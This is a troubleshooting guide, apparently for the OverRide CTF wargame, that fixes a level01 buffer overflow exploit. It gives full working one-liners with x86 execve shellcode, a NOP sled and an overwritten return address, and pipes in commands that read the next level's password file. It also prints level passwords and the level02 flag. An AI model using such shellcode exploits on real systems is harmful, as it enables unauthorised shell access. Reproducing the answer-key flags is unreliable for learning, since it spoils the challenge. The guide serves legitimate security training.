# Level01 Exploit Troubleshooting Guide

## The Problem: Exploit Not Working

If you're experiencing issues with the level01 exploit not working, here's what's likely happening and how to fix it.

## Root Cause: Python Version Mismatch

The **OverRide VM uses Python 2.7**, not Python 3!

### Check Python Version on Server

```bash
ssh level01@192.168.44.139 -p 4242
python --version
# Output: Python 2.7.3
```

## The Solution: Use Python 2 Syntax

### ❌ WRONG (Python 3 syntax - won't work on server)

```bash
python -c "import sys; sys.stdout.buffer.write(b'dat_wil' + b'\x90'*60 + ...)"
```

**Error:**
```
AttributeError: 'file' object has no attribute 'buffer'
```

### ✅ CORRECT (Python 2 syntax - works on server)

```bash
python -c "print \"dat_wil\" + \"\\x90\"*60 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"\\n\" + \"A\"*80 + \"\\x68\\xa0\\x04\\x08\""
```

## Complete Working Exploit

**Run this ON the OverRide server:**

```bash
ssh level01@192.168.44.139 -p 4242
# Password: uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL

(python -c "print \"dat_wil\" + \"\\x90\"*60 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"\\n\" + \"A\"*80 + \"\\x68\\xa0\\x04\\x08\""; echo "whoami"; echo "cat /home/users/level02/.pass") | ./level01
```

**Expected Output:**
```
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

level02
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

## Key Differences: Python 2 vs Python 3

| Feature | Python 2 | Python 3 |
|---------|----------|----------|
| Print | `print "text"` | `print("text")` |
| Byte strings | `"\\x90"` (strings are bytes) | `b"\\x90"` (explicit bytes) |
| Binary output | `sys.stdout.write()` | `sys.stdout.buffer.write()` |
| String prefix | No `b` prefix needed | `b` prefix for bytes |

## Why You Need to Run Python ON the Server

**Option 1: Run Python locally and pipe to SSH** ❌
```bash
# This WON'T work if your local Python version differs from server
(python -c "..."; cat) | ssh level01@192.168.44.139 -p 4242 "./level01"
```

**Problem:** If your local machine has Python 3, the syntax won't work.

**Option 2: Run Python on the server** ✅
```bash
# This WILL work because it uses the server's Python 2.7
ssh level01@192.168.44.139 -p 4242 '(python -c "...") | ./level01'
```

## Alternative: Use Perl (Works Everywhere)

If you want to run the exploit from your local machine regardless of Python version:

```bash
(perl -e 'print "dat_wil" . "\x90"x60 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" . "\n" . "A"x80 . "\x68\xa0\x04\x08" . "\n"'; echo "whoami"; echo "cat /home/users/level02/.pass") | ssh level01@192.168.44.139 -p 4242 "./level01"
```

## Common Mistakes

### 1. Missing the commands after the exploit

❌ **Wrong:**
```bash
python -c "print \"dat_wil\" + ... + \"\\x68\\xa0\\x04\\x08\"" | ./level01
```

**Problem:** Shell spawns but immediately exits because stdin is closed.

✅ **Correct:**
```bash
(python -c "print \"dat_wil\" + ... + \"\\x68\\xa0\\x04\\x08\""; echo "whoami"; echo "cat /home/users/level02/.pass") | ./level01
```

### 2. Wrong escape sequences

❌ **Wrong:**
```bash
python -c "print \"dat_wil\" + \"\x90\"*60 + ..."
```

**Problem:** Shell interprets `\x90` before Python sees it.

✅ **Correct:**
```bash
python -c "print \"dat_wil\" + \"\\x90\"*60 + ..."
```

**Note:** You need **double backslashes** (`\\x90`) when the command is in shell quotes!

### 3. Using `cat` to keep shell alive

This works for interactive shells but NOT for command execution:

❌ **Won't work for remote execution:**
```bash
(python -c "..."; cat) | ssh level01@... "./level01"
```

**Problem:** `cat` waits for input, but SSH closes stdin.

✅ **Use echo commands instead:**
```bash
(python -c "..."; echo "whoami"; echo "cat /home/users/level02/.pass") | ssh level01@... "./level01"
```

## Debugging Steps

### Step 1: Verify the binary works

```bash
ssh level01@192.168.44.139 -p 4242
echo "dat_wil" | ./level01
```

**Expected:**
```
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...
```

### Step 2: Check Python version

```bash
python --version
# Should output: Python 2.7.3
```

### Step 3: Test basic payload

```bash
python -c "print \"dat_wil\"" | ./level01
```

### Step 4: Test with padding

```bash
python -c "print \"dat_wil\\n\" + \"A\"*84" | ./level01
```

**Expected:** Segmentation fault (good! means we're overwriting EIP)

### Step 5: Run full exploit

```bash
(python -c "print \"dat_wil\" + \"\\x90\"*60 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"\\n\" + \"A\"*80 + \"\\x68\\xa0\\x04\\x08\""; echo "whoami") | ./level01
```

**Expected:** `level02`

## Summary

**The exploit works!** You just need to:

1. ✅ Use **Python 2 syntax** (no `b` prefix, use `print` statement)
2. ✅ Run the Python command **on the server** (which has Python 2.7)
3. ✅ Add commands after the exploit (using `echo`) to execute in the spawned shell
4. ✅ Use **double backslashes** (`\\x90`) in shell-quoted strings

**Working one-liner:**
```bash
ssh level01@192.168.44.139 -p 4242
(python -c "print \"dat_wil\" + \"\\x90\"*60 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"\\n\" + \"A\"*80 + \"\\x68\\xa0\\x04\\x08\""; echo "whoami"; echo "cat /home/users/level02/.pass") | ./level01
```

**Flag:** `PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv`

